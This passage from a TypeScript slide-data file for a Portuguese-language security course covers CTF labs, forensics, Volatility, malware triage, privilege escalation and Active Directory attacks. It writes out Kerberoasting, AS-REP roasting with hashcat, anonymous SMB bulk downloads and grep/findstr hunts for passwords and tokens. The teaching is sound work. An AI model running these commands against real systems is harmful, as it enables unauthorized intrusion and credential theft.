        'nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,5985 <IP>',
        '',
        '# RPC sem credenciais, quando permitido pelo lab',
        'rpcclient -U "" -N <IP>',
        'rpcclient $> enumdomusers',
        'rpcclient $> enumdomgroups',
        '',
        '# SMB anônimo e coleta recursiva controlada',
        'smbclient -L //<IP> -N',
        'smbclient //<IP>/Replication -N',
        'smb: \\> recurse ON',
        'smb: \\> prompt OFF',
        'smb: \\> mget *',
        '',
        '# AS-REP Roasting',
        'GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <IP> -outputfile asrep.txt',
        'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt',
        '',
        '# Kerberoasting com credencial válida',
        'GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request -outputfile kerb.txt',
        'hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt',
        '',
        '# Coleta BloodHound',
        'bloodhound-python -d <domain> -u <user> -p <pass> -ns <dc_ip> -c All',
        '',
        '# Validar credenciais sem executar comando remoto',
        'crackmapexec smb <IP> -d <domain> -u <user> -p <pass>',
        'crackmapexec winrm <IP> -d <domain> -u <user> -p <pass>',
      ],
      table: {
        headers: ['Ferramenta', 'Use quando', 'Resultado esperado'],
        rows: [
          ['rpcclient', 'Quer usuários/grupos via RPC, às vezes sem credenciais.', 'RID, usernames e grupos do domínio.'],
          ['smbclient', 'Quer listar shares e baixar arquivos.', 'SYSVOL, Replication, backups, scripts e XMLs.'],
          ['Impacket', 'Quer interagir com protocolos AD em CTF.', 'Hashes, tickets, exec remoto e dumps em lab.'],
          ['BloodHound', 'Quer entender relações e caminho de privilégio.', 'Grafo com arestas como GenericAll, WriteDACL, CanRDP.'],
          ['crackmapexec', 'Quer validar credenciais e permissões rapidamente.', 'Pwn3d, shares, users, policy e protocolos disponíveis.'],
        ]
      }
    }
  },
  {
    id: 'd2-forensics-artifact-workflow', title: 'Forense — Artefato Certo para Cada Pergunta', day: 2, topic: 'Forense',
    type: 'table',
    content: {
      theory: [
        'Forense não começa abrindo tudo. Começa com pergunta. A pergunta define artefato, ferramenta e evidência.',
      ],
      table: {
        headers: ['Pergunta', 'Windows', 'Linux', 'O que comprova'],
        rows: [
          ['Um programa executou?', 'Prefetch, AmCache, ShimCache, Sysmon 1.', 'bash_history, auditd, journalctl, timestamps.', 'Nome, caminho, hash e horário aproximado.'],
          ['Um usuário logou?', 'Security 4624/4625, RDP logs.', 'auth.log, wtmp, btmp, last.', 'Usuário, origem, tipo de logon e horário.'],
          ['Arquivo foi criado/deletado?', '$MFT, USN Journal, Recycle Bin, Sysmon 11/23.', 'ext journal, timestamps, auditd, find.', 'Nome, path, MACB e dono.'],
          ['Houve persistência?', 'Run Keys, Services, Scheduled Tasks.', 'cron, systemd services, authorized_keys.', 'Mecanismo que executa após reboot/login.'],
          ['Houve exfiltração?', 'Browser history, firewall, Sysmon 3, PCAP.', 'proxy logs, shell history, netflow, PCAP.', 'Destino, volume e ferramenta/processo.'],
          ['Credenciais foram acessadas?', 'LSASS access, Security 4672, Sysmon 10.', '/etc/shadow access, sudo logs.', 'Processo acessando fonte de credenciais.'],
        ]
      },
      commands: [
        'sha256sum imagem.dd',
        'mmls imagem.dd',
        'fls -r imagem.dd',
        'icat imagem.dd <inode> > arquivo_extraido',
        'Get-WinEvent -Path caso.evtx | Select-Object -First 20',
      ]
    }
  },
  {
    id: 'd2-pcap-decision-guide', title: 'PCAP — Como Sair do Caos para Evidência', day: 2, topic: 'Forense',
    type: 'commands',
    content: {
      theory: [
        'PCAP tem volume demais. O método é: visão geral, conversas, protocolos, sessões, objetos, credenciais, timeline.',
      ],
      commands: [
        '# Visão geral por terminal',
        'capinfos captura.pcap',
        'tshark -r captura.pcap -q -z io,phs',
        'tshark -r captura.pcap -q -z conv,tcp',
        '',
        '# Filtros Wireshark essenciais',
        'dns',
        'http.request',
        'http.request.method == "POST"',
        'http contains "password"',
        'ftp || ftp-data',
        'smtp || imap || pop',
        'tcp.stream eq 3',
        'ip.addr == <IP>',
        '',
        '# Extração simples com tshark',
        'tshark -r captura.pcap -Y "http.request" -T fields -e frame.time -e ip.src -e http.host -e http.request.uri',
        'tshark -r captura.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e frame.time -e ftp.request.command -e ftp.request.arg',
      ],
      table: {
        headers: ['Achado', 'Interpretação', 'Evidência para relatório'],
        rows: [
          ['POST para /login', 'Tentativa de autenticação.', 'Timestamp, host, URI, parâmetros e resposta.'],
          ['FTP USER/PASS', 'Credenciais em texto claro.', 'Stream, usuário e senha.'],
          ['DNS raro repetido', 'Possível beacon ou descoberta.', 'Domínio, frequência e IP resolvido.'],
          ['Transferência grande', 'Possível download ou exfiltração.', 'Origem, destino, protocolo e bytes.'],
        ]
      }
    }
  },

  // ==================== TRILHA INTENSIVA - DIA 3 ====================
  {
    id: 'd3-intensive-10h-plan', title: 'Dia 3 Intensivo — Roteiro de 10h30', day: 3, topic: 'Forense',
    type: 'table',
    content: {
      theory: [
        'O Dia 3 é sobre encadeamento avançado: memória, malware, MITRE, privilege escalation e Active Directory difícil. Você aprende a justificar uma cadeia inteira, não só achar um comando que funciona.',
      ],
      table: {
        headers: ['Tempo', 'Bloco', 'O que aprender', 'Entrega obrigatória'],
        rows: [
          ['0:00-1:30', 'Volatility básico e triagem', 'info, pslist, pstree, cmdline, netscan, filescan e dumpfiles.', 'Tabela processo -> evidência -> suspeita.'],
          ['1:30-2:45', 'Memória para malware', 'malfind, dlllist, handles, processos órfãos, encoded commands e conexões.', 'Uma hipótese de infecção com prova.'],
          ['2:45-4:00', 'Malware estático seguro', 'file, strings, hashes, PE headers, imports, packers, IOCs e limites da análise.', 'IOC list com hash, strings, URLs e comportamento provável.'],
          ['4:00-5:15', 'MITRE ATT&CK aplicado', 'Tática vs técnica, mapeamento por evidência, como não chutar T-number.', '5 evidências mapeadas para técnicas.'],
          ['5:15-6:45', 'Privesc Linux e Windows', 'SUID, capabilities, sudo, cron, tokens, serviços, registry e permissões.', 'Árvore de decisão de escalada.'],
          ['6:45-7:45', 'AD avançado', 'ForceChangePassword, SeBackupPrivilege, NTDS, ADCS, MSSQL e coerção NTLM em labs.', 'Fluxo de ataque desenhado com pré-requisitos.'],
          ['7:45-10:30', 'Labs Hard', 'Blackfield, Sizzle, Querier, Mantis, Reel2 e Multimaster com timeboxing.', 'Write-up com falhas, pivôs e evidência final.'],
        ]
      }
    }
  },
  {
    id: 'd3-volatility-plugin-map', title: 'Volatility — Plugin Certo para Cada Hipótese', day: 3, topic: 'Forense',
    type: 'table',
    content: {
      theory: [
        'Volatility é uma bancada de investigação. Você escolhe plugin por hipótese: processo, rede, arquivo, DLL, memória injetada ou credencial.',
      ],
      table: {
        headers: ['Hipótese', 'Plugin', 'Comando base', 'Como interpretar'],
        rows: [
          ['Preciso identificar o sistema.', 'windows.info', 'python3 vol.py -f mem.raw windows.info', 'Kernel, build, símbolos e horário ajudam a validar dump.'],
          ['Processo suspeito existe.', 'windows.pslist', 'python3 vol.py -f mem.raw windows.pslist', 'Processos ativos, PID, PPID e horários.'],
          ['Cadeia pai-filho é estranha.', 'windows.pstree', 'python3 vol.py -f mem.raw windows.pstree', 'Office gerando cmd, webserver gerando shell, processo sem pai.'],
          ['Preciso ver argumentos.', 'windows.cmdline', 'python3 vol.py -f mem.raw windows.cmdline', 'EncodedCommand, paths temporários, scripts e URLs.'],
          ['Há conexão de rede.', 'windows.netscan', 'python3 vol.py -f mem.raw windows.netscan', 'IP externo, porta, processo e estado.'],
          ['Pode haver injeção.', 'windows.malfind', 'python3 vol.py -f mem.raw windows.malfind', 'Região RWX, MZ header e bytes suspeitos.'],
          ['Preciso extrair arquivo.', 'windows.filescan + dumpfiles', 'python3 vol.py -f mem.raw windows.filescan', 'Buscar offset e extrair com --physaddr ou --virtaddr.'],
          ['Preciso listar DLLs.', 'windows.dlllist', 'python3 vol.py -f mem.raw windows.dlllist --pid <PID>', 'DLL fora de System32 ou path temporário é sinal.'],
          ['Credenciais locais importam.', 'windows.hashdump', 'python3 vol.py -f mem.raw windows.hashdump', 'Hashes locais, quando disponíveis no dump.'],
        ]
      },
      tips: [
        'Não conclua malware só por um processo estranho. Combine pstree, cmdline, netscan e malfind.',
        'Guarde PID e timestamp. Eles conectam memória, disco e logs.',
      ]
    }
  },
  {
    id: 'd3-malware-safe-workflow', title: 'Malware — Workflow Seguro de Análise Estática', day: 3, topic: 'Malware',
    type: 'commands',
    content: {
      theory: [
        'Neste curso, análise de malware é feita em amostras de laboratório e com foco defensivo. A ordem segura é coletar hash, identificar formato, extrair strings, observar imports e descrever comportamento provável sem executar fora de sandbox.',
      ],
      commands: [
        '# Identificação inicial',
        'file amostra.bin',
        'sha256sum amostra.bin',
        'md5sum amostra.bin',
        '',
        '# Strings e indicadores',
        'strings -a amostra.bin | less',
        'strings -a amostra.bin | grep -Ei "http|https|powershell|cmd.exe|/bin/sh|token|password"',
        'strings -el amostra.bin | grep -Ei "http|powershell|cmd.exe"',
        '',
        '# Estrutura de binário Linux',
        'readelf -h amostra.elf',
        'readelf -s amostra.elf | head',
        'objdump -d amostra.elf | head -80',
        '',
        '# Estrutura geral e bytes iniciais',
        'xxd -l 256 amostra.bin',
        'binwalk amostra.bin',
        '',
        '# Empacotamento comum',
        'upx -t amostra.bin',
        'upx -d amostra.bin -o unpacked.bin',
      ],
      table: {
        headers: ['Achado', 'Interpretação defensiva', 'Próximo passo'],
        rows: [
          ['URL ou IP em strings', 'Possível C2, download ou webhook.', 'Registrar IOC e buscar em PCAP/logs.'],
          ['PowerShell EncodedCommand', 'Execução ofuscada em Windows.', 'Decodificar em ambiente seguro e mapear MITRE.'],
          ['UPX', 'Binário empacotado.', 'Testar desempacotamento e repetir strings.'],
          ['Imports de rede', 'Capacidade de conexão.', 'Correlacionar com netscan, Sysmon 3 ou firewall.'],
          ['Registry Run', 'Possível persistência.', 'Mapear para T1547.001 e procurar evidência no host.'],
        ]
      }
    }
  },
  {
    id: 'd3-privesc-linux-decision-tree', title: 'Privesc Linux — Árvore de Decisão', day: 3, topic: 'Red Team',
    type: 'commands',
    content: {
      theory: [
        'Escalada Linux é investigação local. Cada etapa tenta responder se você já tem uma permissão que vira root ou se precisa encontrar configuração fraca.',
      ],
      commands: [
        '# Identidade e sistema',
        'whoami; id; hostname',
        'uname -a; cat /etc/os-release',
        '',
        '# Sudo e grupos',
        'sudo -l',
        'groups',
        '',
        '# SUID, SGID e capabilities',
        'find / -perm -4000 -type f 2>/dev/null',
        'find / -perm -2000 -type f 2>/dev/null',
        'getcap -r / 2>/dev/null',
        '',
        '# Arquivos e diretórios graváveis',
        'find / -writable -type d 2>/dev/null | grep -v "/proc"',
        'find / -writable -type f 2>/dev/null | grep -v "/proc"',
        '',
        '# Cron e serviços',
        'cat /etc/crontab',
        'ls -la /etc/cron.d /etc/cron.daily /var/spool/cron 2>/dev/null',
        'systemctl list-timers 2>/dev/null',
        '',
        '# Segredos prováveis',
        'grep -R "password\\|passwd\\|pwd\\|secret\\|token" /home /opt /var/www 2>/dev/null',
        'find / -name "*.bak" -o -name "*.old" -o -name "*.zip" 2>/dev/null',
      ],
      table: {
        headers: ['Se encontrar', 'O que significa', 'Como validar'],
        rows: [
          ['sudo NOPASSWD', 'Comando permitido pode executar como root.', 'Consultar GTFOBins e testar no lab.'],
          ['SUID incomum', 'Binário roda como dono, talvez root.', 'Ver dono, versão e funções perigosas.'],
          ['cap_setuid+ep', 'Processo pode mudar UID.', 'Testar binário com técnica documentada.'],
          ['Script cron gravável', 'Root executa algo que você altera.', 'Confirmar frequência e dono antes de editar no lab.'],
          ['Credencial em config', 'Reaproveitamento de senha.', 'Testar serviço local ou usuário relacionado.'],
        ]
      }
    }
  },
  {
    id: 'd3-privesc-windows-decision-tree', title: 'Privesc Windows — Árvore de Decisão', day: 3, topic: 'Red Team',
    type: 'commands',
    content: {
      theory: [
        'No Windows, privilégio vem de token, grupo, serviço, registry, credenciais ou patch. A enumeração precisa separar o que é informação do que é vetor explorável.',
      ],
      commands: [
        '# Identidade e privilégios',
        'whoami /user',
        'whoami /groups',
        'whoami /priv',
        '',
        '# Sistema e patches',
        'systeminfo',
        'wmic qfe get Caption,Description,HotFixID,InstalledOn',
        '',
        '# Serviços e caminhos',
        'wmic service get name,displayname,pathname,startmode | findstr /i "auto"',
        'sc qc <ServiceName>',
        'sc query <ServiceName>',
        '',
        '# AlwaysInstallElevated',
        'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
        'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
        '',
        '# Credenciais e histórico',
        'cmdkey /list',
        'dir /s /b *pass* *cred* *config* 2>nul',
        'findstr /si "password pwd secret token" *.txt *.ini *.config 2>nul',
        '',
        '# Rede local',
        'netstat -ano',
        'tasklist /svc',
      ],
      table: {
        headers: ['Achado', 'Por que importa', 'Validação segura em lab'],
        rows: [
          ['SeImpersonatePrivilege', 'Pode permitir impersonation para SYSTEM em versões vulneráveis.', 'Ver OS, contexto de serviço e técnica compatível.'],
          ['Service path não aspado', 'Windows pode executar binário em caminho parcial.', 'Confirmar permissão de escrita no diretório.'],
          ['Serviço com binPath alterável', 'Usuário pode trocar executável do serviço.', 'accesschk ou sc sdshow para permissões.'],
          ['AlwaysInstallElevated em HKCU e HKLM', 'MSI pode instalar como admin.', 'Ambas as chaves precisam estar ativas.'],
          ['Credenciais salvas', 'Podem abrir WinRM, RDP, SMB ou usuário local.', 'Validar com comando sem impacto.'],
        ]
      }
    }
  },
  {
    id: 'd3-advanced-ad-abuse-map', title: 'AD Avançado — Pré-Requisitos e Ferramentas', day: 3, topic: 'Active Directory',
    type: 'table',
    content: {
      theory: [
        'Técnicas avançadas de AD não são feitiços: cada uma exige uma permissão específica. Aprenda o pré-requisito, a evidência e a ferramenta apropriada.',
      ],
      table: {
        headers: ['Técnica', 'Pré-requisito', 'Ferramenta comum', 'Evidência de que faz sentido'],
        rows: [
          ['ForceChangePassword', 'Aresta no BloodHound sobre uma conta.', 'net rpc password.', 'BloodHound mostra ForceChangePassword do usuário atual.'],
          ['DCSync', 'Replicating Directory Changes ou equivalente.', 'secretsdump.py.', 'BloodHound mostra CanDCSync ou WriteDACL explorável.'],
          ['SeBackupPrivilege', 'Token com privilégio de backup.', 'diskshadow, robocopy /b, secretsdump offline.', 'whoami /priv mostra SeBackupPrivilege enabled/available.'],
          ['Kerberoasting', 'Credencial válida e conta com SPN.', 'GetUserSPNs.py, hashcat.', 'LDAP revela servicePrincipalName.'],
          ['AS-REP Roasting', 'Conta sem pré-autenticação Kerberos.', 'GetNPUsers.py, hashcat.', 'UserAccountControl com DONT_REQ_PREAUTH.'],
          ['ADCS abuse', 'Template vulnerável ou enrolamento permissivo.', 'certipy.', 'Enumeração mostra ESC1/ESC8 ou template fraco.'],
          ['MSSQL xp_cmdshell', 'Credencial SQL/sysadmin ou misconfig.', 'mssqlclient.py.', 'Login no MSSQL e permissão para habilitar xp_cmdshell.'],
          ['Responder/NTLM capture', 'Coerção ou share que força autenticação em lab.', 'responder, ntlmrelayx.', 'Host Windows tentando autenticar no seu listener autorizado.'],
        ]
      },
      tips: [
        'Se você não sabe o pré-requisito, ainda não está pronto para executar a técnica. Volte para enumeração.',
        'BloodHound mostra caminhos possíveis, não garantias. Valide cada aresta antes de agir.',
      ]
    }
  },

  // ==================== TRILHA INTENSIVA - DIA 4 ====================
  {
    id: 'd4-intensive-10h-plan', title: 'Dia 4 Intensivo — Roteiro de 10h30', day: 4, topic: 'Revisão',
    type: 'table',
    content: {
      theory: [
        'O Dia 4 transforma conhecimento em desempenho. A meta é revisar, simular pressão, documentar e corrigir lacunas sem abrir novas frentes desnecessárias.',
      ],
      table: {
        headers: ['Tempo', 'Bloco', 'O que treinar', 'Entrega obrigatória'],
        rows: [
          ['0:00-1:00', 'Revisão ativa', 'Portas, ferramentas, Event IDs, AD, forense, privesc e MITRE por perguntas.', 'Flashcards respondidos sem consulta.'],
          ['1:00-2:00', 'Comandos explicados', 'Cada aluno explica 15 comandos: quando usar, saída esperada e erro comum.', 'Tabela comando -> intenção -> evidência.'],
          ['2:00-3:30', 'Simulado Blue Team', 'Receber logs/PCAP e montar timeline com evidência.', 'Timeline com hipótese e conclusão.'],
          ['3:30-5:00', 'Simulado Red Team', 'Reconhecimento e enumeração com tempo limitado.', 'Scan salvo, árvore de hipóteses e próximos passos.'],
          ['5:00-6:30', 'Relatório técnico', 'Sumário executivo, escopo, evidências, impacto, MITRE e recomendações.', 'Finding completo com evidência.'],
          ['6:30-8:30', 'Speed runs', 'Repetir labs conhecidos com cronômetro e documentação em tempo real.', 'Tempo, bloqueios e comandos usados.'],
          ['8:30-10:30', 'Debrief e lacunas', 'Revisar erros, refazer pontos fracos e consolidar checklist final.', 'Plano individual de reforço.'],
        ]
      }
    }
  },
  {
    id: 'd4-command-mastery-index', title: 'Comandos Essenciais — O Que Cada Um Ensina', day: 4, topic: 'Revisão',
    type: 'table',
    content: {
      table: {
        headers: ['Comando', 'Aprendizado', 'Quando usar', 'Erro comum'],
        rows: [
          ['nmap -sC -sV -oN scan.txt <IP>', 'Serviços e versões iniciais.', 'Primeiro scan TCP.', 'Não salvar saída.'],
          ['nmap -p- --min-rate 5000 <IP>', 'Portas TCP fora do comum.', 'Depois do scan inicial.', 'Não confirmar portas com -sV.'],
          ['curl -i -L http://<host>/', 'Headers, redirects e cookies.', 'Antes de fuzzing web.', 'Ignorar Set-Cookie e Location.'],
          ['ffuf -u http://<host>/FUZZ -w wordlist.txt', 'Rotas e arquivos escondidos.', 'Após enumeração manual.', 'Não filtrar falso positivo.'],
          ['smbclient -L //<IP> -N', 'Shares SMB anônimos.', 'Quando porta 445 aberta.', 'Não tentar -N antes de credenciais.'],
          ['rpcclient -U "" -N <IP>', 'Usuários e grupos via RPC.', 'DC/Samba permissivo em lab.', 'Não salvar usernames.'],
          ['GetNPUsers.py <domain>/ -usersfile users.txt -no-pass', 'AS-REP Roasting.', 'Depois de obter lista de usuários.', 'Rodar sem domínio/DNS corretos.'],
          ['GetUserSPNs.py <domain>/<user>:<pass> -request', 'Kerberoasting.', 'Com credencial válida.', 'Assumir que todo hash vai quebrar rápido.'],
          ['bloodhound-python -d <domain> -u <user> -p <pass> -c All', 'Relações AD.', 'Depois de credencial válida.', 'Executar e não interpretar arestas.'],
          ['sudo -l', 'Privilégios sudo.', 'Primeiro minuto pós-shell Linux.', 'Esquecer porque shell é limitado.'],
          ['find / -perm -4000 -type f 2>/dev/null', 'SUID.', 'Privesc Linux.', 'Explorar binário comum sem contexto.'],
          ['whoami /priv', 'Privilégios de token.', 'Primeiro minuto pós-shell Windows.', 'Não diferenciar enabled de disabled.'],
          ['python3 vol.py -f mem.raw windows.pstree', 'Cadeia de processos.', 'Triagem de memória.', 'Olhar lista sem pai-filho.'],
          ['hashcat -m 18200 asrep.txt rockyou.txt', 'Cracking AS-REP.', 'Após GetNPUsers.', 'Usar modo de hash errado.'],
        ]
      }
    }
  },
  {
    id: 'd4-report-rubric', title: 'Relatório — Rubrica de Qualidade', day: 4, topic: 'Revisão',
    type: 'table',
    content: {
      theory: [
        'Relatório bom não é longo; é verificável. Cada afirmação precisa de evidência, horário, sistema afetado e impacto.',
      ],
      table: {
        headers: ['Seção', 'Precisa conter', 'Sinal de qualidade'],
        rows: [
          ['Sumário executivo', 'O que aconteceu, impacto e estado final.', 'Uma pessoa não técnica entende o risco.'],
          ['Escopo', 'Alvos, ambiente autorizado e limitações.', 'Fica claro que a atividade foi permitida.'],
          ['Timeline', 'Timestamp, evento, fonte e evidência.', 'Eventos contam uma história coerente.'],
          ['Achado técnico', 'Descrição, passos reproduzíveis, evidência e impacto.', 'Outra pessoa consegue validar.'],
          ['MITRE ATT&CK', 'Tática, técnica e motivo do mapeamento.', 'T-number apoiado por comportamento real.'],
          ['Recomendação', 'Ação concreta, prioridade e dono provável.', 'Não é genérica como "melhorar segurança".'],
          ['Anexos', 'Comandos, outputs relevantes, hashes, screenshots e PCAP/logs.', 'Evidência preservada sem poluir o texto principal.'],
        ]
      },
      tips: [
        'Troque "parece comprometido" por "houve logon 4624 tipo 3 do usuário X às 03:14 a partir do IP Y".',
        'Troque "rodei ferramenta" por "a ferramenta confirmou porta 445 aberta com SMB e share Replication legível".',
      ]
    }
  },
  {
    id: 'd4-exam-timeboxing', title: 'Simulado — Gestão de Tempo e Decisão', day: 4, topic: 'Revisão',
    type: 'checklist',
    content: {
      theory: [
        'Pressão de tempo destrói quem não tem ritual. Use blocos fixos para evitar ficar preso em uma hipótese ruim.',
      ],
      checklist: [
        '0-10 min: criar pasta, anotar escopo, iniciar scan inicial e scan de todas as portas.',
        '10-25 min: ler Nmap, adicionar hostnames, abrir serviços manualmente.',
        '25-45 min: enumeração específica por serviço aberto, salvando evidências.',
        '45-60 min: escolher um vetor principal e um vetor reserva.',
        '60-90 min: explorar apenas hipótese com evidência suficiente em ambiente autorizado.',
        'Após shell: whoami/id ou whoami /priv imediatamente.',
        'A cada 20 min travado: escrever o que sabe, o que tentou e qual pergunta falta responder.',
        'Nunca deixar documentação para o final; registrar comando e resultado enquanto acontece.',
        'No debrief: separar erro de conhecimento, erro de atenção e erro de método.',
      ],
      tips: [
        'Timeboxing não é desistir. É impedir que uma hipótese fraca consuma o dia inteiro.',
      ]
    }
  },
  {
    id: 'd4-full-knowledge-map', title: 'Mapa Final — Como Todos os Assuntos se Conectam', day: 4, topic: 'Revisão',
    type: 'table',
    content: {
      table: {
        headers: ['Área', 'Pergunta central', 'Ferramentas', 'Evidência produzida'],
        rows: [
          ['Redes', 'Que portas e protocolos existem?', 'nmap, Wireshark, tcpdump, tshark.', 'Portas, serviços, conversas, pacotes.'],
          ['Web', 'Como a aplicação recebe e responde dados?', 'curl, navegador, ffuf, gobuster.', 'Headers, rotas, parâmetros, status codes.'],
          ['Linux', 'Que permissões e configurações viram privilégio?', 'sudo, find, getcap, ps, ss, journalctl.', 'SUID, capabilities, cron, logs, processos.'],
          ['Windows', 'Quem autenticou e que processo executou?', 'Event Viewer, PowerShell, Sysmon, whoami.', 'Event IDs, tokens, serviços, command line.'],
          ['Active Directory', 'Quais identidades e relações criam caminho de ataque?', 'rpcclient, ldapsearch, Impacket, BloodHound.', 'Usuários, grupos, SPNs, arestas e tickets.'],
          ['Forense', 'O que aconteceu, quando e qual artefato prova?', 'Autopsy, sleuthkit, Volatility, Wazuh.', 'Timeline, arquivos, processos, memória, alertas.'],
          ['Malware', 'O binário tenta fazer o quê?', 'file, strings, hashes, readelf, objdump.', 'IOCs, imports, URLs, comportamento provável.'],
          ['MITRE', 'Qual técnica descreve o comportamento?', 'ATT&CK Matrix, relatório técnico.', 'Tática, técnica, evidência e impacto.'],
        ]
      }
    }
  },
];

const expandedTheorySlides: Slide[] = [
  {
    id: 'd1-deep-theory-recon-model', title: 'Teoria Profunda — Como Pensar Reconhecimento', day: 1, topic: 'Ferramentas',
    type: 'theory',
    content: {
      theory: [
        'Reconhecimento não é "rodar Nmap e ver no que dá". Reconhecimento é construir um modelo do alvo. Esse modelo começa simples: existe um IP, talvez um domínio, talvez um conjunto de portas. A cada evidência nova, você atualiza o modelo: "porta 80 com Apache", "porta 445 com SMB", "hostname revelado por certificado", "aplicação redireciona para vhost", "FTP aceita anonymous". O valor está menos no comando e mais na interpretação que vem depois dele.',
        'Em CTF e laboratório, a primeira armadilha é pular da primeira porta aberta diretamente para exploração. Isso cria buracos de raciocínio. Se você vê HTTP na 80, SMB na 445 e SSH na 22, não significa que HTTP é o vetor. Significa que existem três superfícies de enumeração. Você precisa extrair evidências de cada uma: headers e rotas no HTTP, shares e permissões no SMB, versão e política de autenticação no SSH. Só depois escolhe uma hipótese principal.',
        'Uma boa enumeração sempre responde quatro perguntas: o que existe, qual versão/tecnologia, que dado ou comportamento foi exposto e qual decisão isso permite. Por exemplo: "SMB 445 aberto" ainda é só existência. "Share Replication acessível sem senha e contém Groups.xml" já é evidência acionável. "HTTP 200 em /admin" ainda é só caminho. "Form de login aceita credenciais padrão documentadas no painel" já é hipótese testável.',
        'O ciclo correto é repetitivo: descobrir, enumerar, validar, documentar. Descobrir é achar portas/hosts. Enumerar é conversar com cada serviço no idioma dele. Validar é confirmar se o achado realmente funciona. Documentar é escrever de onde veio a evidência. Sem documentação, o aluno até pode pegar uma flag, mas não aprendeu a explicar o ataque nem a defender contra ele.',
        'Durante os labs do Dia 1, você verá esse ciclo em formas diferentes: Cap depende de perceber um padrão em URL e analisar PCAP; Nibbles depende de ler HTML e entender upload; Jerry depende de reconhecer Tomcat Manager; Devel depende de conectar FTP com IIS; Blue depende de SMBv1/MS17-010; Lame depende de versão vulnerável do Samba. Nada disso deve parecer surpresa quando chegar ao lab.',
      ],
      tips: [
        'Regra prática: se você não consegue explicar por que rodou o comando, ainda não deveria rodá-lo.',
        'Regra de prova: nenhuma exploração antes de pelo menos uma enumeração manual por serviço aberto.',
      ]
    }
  },
  {
    id: 'd1-deep-theory-network-web-linux', title: 'Teoria Profunda — Redes, Web e Linux em Uma Cadeia', day: 1, topic: 'Redes',
    type: 'theory',
    content: {
      theory: [
        'TCP/IP é a base porque todo serviço do lab aparece como uma conversa de rede. TCP usa conexão e controle de estado; por isso Nmap consegue inferir open, closed e filtered observando SYN, SYN-ACK, RST e ausência de resposta. UDP não tem esse mesmo handshake, então respostas ambíguas são normais. Quando você entende isso, deixa de tratar "filtered" ou "open|filtered" como erro e passa a tratar como dado parcial.',
        'Portas são convenções, não garantias. Porta 80 normalmente é HTTP, mas uma aplicação pode rodar em 8080, 8000, 5000 ou qualquer outra. Porta 445 normalmente indica SMB, mas a versão, o signing, os shares e a autenticação importam mais que o número. Porta 21 indica FTP, mas o detalhe que muda o jogo é se anonymous funciona, se há permissão de escrita e se as credenciais trafegam em claro.',
        'Web exige duas leituras: leitura de protocolo e leitura de aplicação. No protocolo, você observa status code, headers, cookies, redirects, métodos e content type. Na aplicação, você observa rotas, formulários, mensagens de erro, comentários HTML, upload, autenticação e autorização. Muitas máquinas fáceis do Hack The Box ensinam justamente isso: o vetor não está escondido em uma técnica avançada; está em uma pista simples ignorada por quem só roda ferramenta.',
        'Linux entra depois do foothold, mas precisa ser ensinado antes. Ao obter uma shell, o aluno precisa saber onde está, quem é, quais grupos possui, que binários têm SUID, que capabilities existem, que cron jobs executam e que arquivos de configuração podem conter senhas. Esse conhecimento explica a escalada da Cap por capability no Python e a Nibbles por sudo NOPASSWD em script controlável.',
        'A ponte entre rede, web e Linux é o fluxo: a rede revela serviço, a aplicação revela credencial ou execução, o sistema operacional revela privilégio. Se o aluno entende o fluxo, ele não memoriza "Cap é FTP + Python capability"; ele aprende que tráfego pode vazar credencial e capability mal configurada pode virar root.',
      ],
      table: {
        headers: ['Conceito', 'O que precisa ficar claro', 'Onde aparece nos labs'],
        rows: [
          ['TCP/portas', 'Estado open/filtered muda a estratégia de enumeração.', 'Todos os labs começam por scan e leitura de portas.'],
          ['FTP em texto claro', 'USER/PASS podem ser recuperados em PCAP.', 'Cap.'],
          ['Comentários HTML', 'Código-fonte pode revelar diretórios e pistas.', 'Nibbles.'],
          ['Upload inseguro', 'Arquivo enviado pode ser executado se validação for fraca.', 'Nibbles e Devel.'],
          ['Manager exposto', 'Painel administrativo com credenciais fracas vira RCE.', 'Jerry.'],
          ['SUID/capabilities/sudo', 'Privilégios locais mal configurados viram root.', 'Cap e Nibbles.'],
          ['SMB vulnerável', 'Versão e patch level importam antes de explorar.', 'Blue e Lame.'],
        ]
      }
    }
  },
  {
    id: 'd1-lab-bridge-all-machines', title: 'Antes dos Labs — Tudo que Aparece no Dia 1', day: 1, topic: 'Labs',
    type: 'table',
    content: {
      theory: [
        'Use esta página como contrato didático: se algo aparece nos labs do Dia 1, o conceito precisa ter sido visto antes. O aluno não precisa decorar a resolução, mas precisa reconhecer o tipo de evidência e saber qual ferramenta conversa com aquele serviço.',
      ],
      table: {
        headers: ['Lab', 'Conceitos ensinados antes', 'Ferramentas esperadas', 'O aluno deve saber explicar antes de começar'],
        rows: [
          ['Cap', 'HTTP com padrão de URL, PCAP, FTP em texto claro, SSH com senha reaproveitada, Linux capabilities.', 'nmap, curl/navegador, Wireshark/tshark, ftp, ssh, getcap.', 'Como um PCAP revela credenciais e por que cap_setuid+ep em Python permite mudar UID para root.'],
          ['Nibbles', 'Leitura de HTML, diretório escondido, CMS, painel admin, upload inseguro, reverse shell em lab, sudo NOPASSWD.', 'curl, gobuster/ffuf, navegador, netcat, sudo -l.', 'Por que comentário HTML é evidência e por que upload sem validação de extensão/content type permite execução.'],
          ['Jerry', 'Apache Tomcat, Manager exposto, credenciais padrão, WAR/JSP, serviço Windows rodando com privilégio alto.', 'nmap, navegador, curl, msfvenom em lab, listener.', 'O que é um WAR, por que o Manager faz deploy e por que credenciais padrão são falha crítica.'],
          ['Devel', 'FTP anonymous com escrita, raiz web IIS, ASPX executável, webshell em lab, enumeração Windows pós-shell.', 'ftp, curl/navegador, msfvenom em lab, nc, whoami/systeminfo.', 'Como escrita no FTP vira execução se o diretório servido pelo IIS interpreta ASPX.'],
          ['Blue', 'SMBv1, MS17-010, diferença entre versão e vulnerabilidade confirmada, exploração controlada em lab.', 'nmap NSE, smb scripts, ferramentas de lab.', 'Por que SMBv1 é perigoso e por que é preciso confirmar vulnerabilidade antes de explorar.'],
          ['Lame', 'Samba antigo, CVE por versão, command injection no username, validação de serviço.', 'nmap, smbclient, searchsploit em lab.', 'Como versão vulnerável direciona pesquisa, mas ainda exige confirmar contexto e serviço real.'],
